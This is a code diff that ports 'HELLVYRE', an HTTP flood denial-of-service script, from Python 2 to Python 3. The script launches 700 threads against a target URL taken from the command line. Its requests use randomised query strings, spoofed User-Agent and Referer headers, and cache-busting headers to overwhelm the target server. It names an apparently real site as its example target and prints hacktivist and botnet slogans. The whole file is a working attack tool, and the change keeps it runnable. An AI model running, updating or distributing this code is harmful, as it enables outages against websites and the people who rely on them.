@@ -1,155 +1,159 @@
-
-import urllib2
+import urllib.request
 import sys
 import threading
 import random
 import re
 
-url=''
-host=''
-headers_useragents=[]
-headers_referers=[]
-request_counter=0
-flag=0
-safe=0
+url = ''
+host = ''
+headers_useragents = []
+headers_referers = []
+request_counter = 0
+flag = 0
+safe = 0
 
 def inc_counter():
 	global request_counter
-	request_counter+=9999
+	request_counter += 9999
 
 def set_flag(val):
 	global flag
-	flag=val
+	flag = val
 
 def set_safe():
 	global safe
-	safe=1	
+	safe = 1	
+
 def useragent_list():
-    global headers_useragents
-    headers_useragents = []
-    with open('useragents.txt', 'r') as f:
-        headers_useragents = [line.strip() for line in f if line.strip()]
+	global headers_useragents
+	headers_useragents = []
+	with open('useragents.txt', 'r', encoding='utf-8') as f:
+		headers_useragents = [line.strip() for line in f if line.strip()]
 
 def referer_list():
-    global headers_referers
-    headers_referers = []
-    with open('referers.txt', 'r') as f:
-        headers_referers = [line.strip() for line in f if line.strip()]
-    headers_referers.append('http://' + host + '/')
-    return(headers_referers)
+	global headers_referers
+	headers_referers = []
+	with open('referers.txt', 'r', encoding='utf-8') as f:
+		headers_referers = [line.strip() for line in f if line.strip()]
+	headers_referers.append('http://' + host + '/')
+	return headers_referers
 
 def buildblock(size):
 	out_str = ''
 	for i in range(0, size):
 		a = random.randint(65, 160)
 		out_str += chr(a)
-	return(out_str)
+	return out_str
 
 def usage():
-	print 'HELLVYRE DDoS Tool ( individual Dangerous Denial of Service )'
-	print 'New loaded Botnets: 1,798,445,657'
-	print 'Usage: HELLVYRE (url)'
-	print 'Example: HELLVYRE.py http://luthi.co.il/'
-	print "\a"
-print \
-"""
-        /|                                           |\
-      /||             ^               ^             ||\
-     / \\__          //               \\          __// \
-    /  |_  \         | \   /     \   / |         /  _|  \
-   /  /  \  \         \  \/ \---/ \/  /         /  /     \
-  /  /    |  \         \  \/\   /\/  /         /  |       \
- /  /     \   \__       \ ( 0\ /0 ) /       __/   /        \
-/  /       \     \___    \ \_/|\_/ /    ___/     /\         \
-/  /         \_)      \___ \/-\|/-\/ ___/      (_/\ \      `  \
-/  /           /\__)       \/  oVo  \/       (__/   ` \      `  \
-/  /           /,   \__)    (_/\ _ /\_)    (__/         `      \  \
-/  '           //       \__)  (__V_V__)  (__/                    \  \
-/  '  '        /'           \   |{___}|   /         .              \  \
-/  '  /        /              \/ |{___}| \/\          `              \  \
-/     /        '       .        \/{_____}\/  \          \    `         \  \
-     /                ,         /{_______}\   \          \    \         \
-                     /         /{___/_\___}\   `          \    `        
+	print('HELLVYRE DDoS Tool ( individual Dangerous Denial of Service )')
+	print('New loaded Botnets: 1,798,445,657')
+	print('Usage: HELLVYRE (url)')
+	print('Example: HELLVYRE.py http://luthi.co.il/')
+	print("\a")
+
+print("""
+        /|                                           |\\
+      /||             ^               ^             ||\\
+     / \\\\__          //               \\\\          __// \\
+    /  |_  \\         | \\   /     \\   / |         /  _|  \\
+   /  /  \\  \\         \\  \\/ \\---/ \\/  /         /  /     \\
+  /  /    |  \\         \\  \\/\\   /\\/  /         /  |       \\
+ /  /     \\   \\__       \\ ( 0\\ /0 ) /       __/   /        \\
+/  /       \\     \\___    \\ \\_/|\\_/ /    ___/     /\\         \\
+/  /         \\_)      \\___ \\/-\\|/-\\/ ___/      (_/\\ \\      `  \\
+/  /           /\\__)       \\/  oVo  \\/       (__/   ` \\      `  \\
+/  /           /,   \\__)    (_/\\ _ /\\_)    (__/         `      \\  \\
+/  '           //       \\__)  (__V_V__)  (__/                    \\  \\
+/  '  '        /'           \\   |{___}|   /         .              \\  \\
+/  '  /        /              \\/ |{___}| \\/\\          `              \\  \\
+/     /        '       .        \\/{_____}\\/  \\          \\    `         \\  \\
+     /                ,         /{_______}\\   \\          \\    \\         \\
+                     /         /{___/_\\___}\\   `          \\    `        
 
 ~>HELLVYRE DDoS Tool<~
 ~~>Created By Threadlinee<~~
 
     '
                                                        
-""" 
+""") 
 
 	
 def httpcall(url):
 	useragent_list()
 	referer_list()
-	code=0
-	if url.count("?")>0:
-		param_joiner="&"
+	code = 0
+	if url.count("?") > 0:
+		param_joiner = "&"
 	else:
-		param_joiner="?"
-	request = urllib2.Request(url + param_joiner + buildblock(random.randint(3,10)) + '=' + buildblock(random.randint(3,10)))
+		param_joiner = "?"
+	request = urllib.request.Request(
+		url + param_joiner + buildblock(random.randint(3,10)) + '=' + buildblock(random.randint(3,10))
+	)
 	request.add_header('User-Agent', random.choice(headers_useragents))
 	request.add_header('Cache-Control', 'no-cache')
 	request.add_header('Accept-Charset', 'ISO-8859-1,utf-8;q=0.7,*;q=0.7')
 	request.add_header('Referer', random.choice(headers_referers) + buildblock(random.randint(50,100)))
-	request.add_header('Keep-Alive', random.randint(110,160))
+	request.add_header('Keep-Alive', str(random.randint(110,160)))
 	request.add_header('Connection', 'keep-alive')
-	request.add_header('Host',host)
+	request.add_header('Host', host)
+	
 	try:
-			urllib2.urlopen(request)
-	except urllib2.HTTPError, e:
-			set_flag(1)
-			print "----->>> ! We are Anonymous - ExpectUS ! <<<-----"
-			code=500
-	except urllib2.URLError, e:
-			sys.exit()
+		urllib.request.urlopen(request)
+	except urllib.error.HTTPError as e:
+		set_flag(1)
+		print("----->>> ! We are Anonymous - ExpectUS ! <<<-----")
+		code = 500
+	except urllib.error.URLError as e:
+		sys.exit()
 	else:
-			inc_counter()
-			urllib2.urlopen(request)
-	return(code)		
+		inc_counter()
+		urllib.request.urlopen(request)
+	return code		
 
 	
 class HTTPThread(threading.Thread):
 	def run(self):
 		try:
-			while flag<2:
-				code=httpcall(url)
-				if (code==500) & (safe==1):
+			while flag < 2:
+				code = httpcall(url)
+				if (code == 500) and (safe == 1):
 					set_flag(2)
-		except Exception, ex:
+		except Exception as ex:
 			pass
 
 class MonitorThread(threading.Thread):
 	def run(self):
-		previous=request_counter
-		while flag==0:
-			if (previous+100<request_counter) & (previous<>request_counter):
-				previous=request_counter
-		if flag==2:
-			print "\n-- Sending mass amounf of packets generated by Liphyra Botnet --"
+		previous = request_counter
+		while flag == 0:
+			if (previous + 100 < request_counter) and (previous != request_counter):
+				previous = request_counter
+		if flag == 2:
+			print("\n-- Sending mass amount of packets generated by Liphyra Botnet --")
 
-if len(sys.argv) < 2:
-	usage()
-	sys.exit()
-else:
-	if sys.argv[1]=="help":
+if __name__ == "__main__":
+	if len(sys.argv) < 2:
 		usage()
 		sys.exit()
 	else:
-		print "Starting the Attack"
-		print "Threadlinee"
-		if len(sys.argv)== 3:
-			if sys.argv[2]=="safe":
-				set_safe()
-		url = sys.argv[1]
-		if url.count("/")==2:
-			url = url + "/"
-		m = re.search('http\://([^/]*)/?.*', url)
-		host = m.group(1)
-		for i in range(700):
-			t = HTTPThread()
+		if sys.argv[1] == "help":
+			usage()
+			sys.exit()
+		else:
+			print("Starting the Attack")
+			print("Threadlinee")
+			if len(sys.argv) == 3:
+				if sys.argv[2] == "safe":
+					set_safe()
+			url = sys.argv[1]
+			if url.count("/") == 2:
+				url = url + "/"
+			m = re.search('http://([^/]*)/?.*', url)
+			host = m.group(1)
+			for i in range(700):
+				t = HTTPThread()
+				t.start()
+			t = MonitorThread()
 			t.start()
-		t = MonitorThread()
-		t.start()
 
 	
